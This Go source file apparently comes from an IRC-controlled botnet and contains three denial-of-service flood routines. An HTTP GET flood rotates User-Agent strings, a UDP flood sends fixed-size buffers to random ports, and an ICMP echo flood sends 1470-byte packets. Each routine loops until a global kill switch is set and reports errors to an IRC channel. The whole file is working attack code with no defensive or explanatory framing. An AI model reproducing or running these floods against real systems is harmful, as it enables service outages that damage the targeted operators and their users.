package tools

import (
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var DDoS_Switch bool

func HTTP(getTarget, set_chan string, reportIRC net.Conn) {
	agent_array := []string{
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
	}
	request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
	if err != nil {
		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
	}
	_http := &http.Client{}

	for {
		for i := range agent_array {
			request.Header.Set("User-Agent", agent_array[i])
			__http, _ := _http.Do(request)
			__http.Body.Close()
		}
		if DDoS_Switch {
			break
		}
	}
}

func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
	_size, _ := strconv.Atoi(size)
	if _size <= 0 || _size > 700 {
		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+
			"Buffer size must not <= 0 or > 700. Auto Buffer to 700.")
		_size = 700
	}

	rand.Seed(time.Now().UnixNano())
	buffer := make([]byte, _size)

	for {
		udp, err := net.Dial("udp", udpTarget+":"+fmt.Sprint(rand.Intn(65535)))
		if err != nil {
			IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
		}
		udp.Write(buffer)
		udp.Close()
		if DDoS_Switch {
			break
		}
	}
}

func ICMP(icmpTarget, set_chan string, reportIRC net.Conn) {
	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
	if err != nil {
		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
	}
	defer conn.Close()

	buffer := make([]byte, 1470)
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: []byte(buffer),
		},
	}

	for {
		wb, _ := wm.Marshal(nil)
		conn.WriteTo(wb, &net.UDPAddr{IP: net.ParseIP(icmpTarget)})
		if DDoS_Switch {
			break
		}
	}
}
